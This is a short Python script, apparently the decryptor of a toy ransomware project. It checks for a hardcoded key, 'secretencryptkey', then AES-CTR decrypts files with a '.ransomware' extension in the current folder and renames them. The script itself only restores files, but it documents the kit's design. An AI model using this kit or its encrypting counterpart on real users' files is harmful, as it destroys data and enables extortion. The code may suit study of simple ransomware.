import os
import pyaes

secret = input("What the secret key?")

if secret == "secretencryptkey":
    for name in os.listdir("./"):
        if name != "decrypt.py" and name != "encrypt.py" and name.split(".")[-1] == "ransomware":
            with open(name, "rb") as file:
                file_data = file.read()

                key = secret.encode()
                aes = pyaes.AESModeOfOperationCTR(key)

                data_decrypt = aes.decrypt(file_data)

                with open(name, "wb") as file:
                    file.write(data_decrypt)

                list = name.split(".")
                new_name = "{}.{}".format(list[0],list[1])
                os.rename("./{}".format(name), "./{}".format(new_name))
else:
    print("Wrong Decrypt Key!")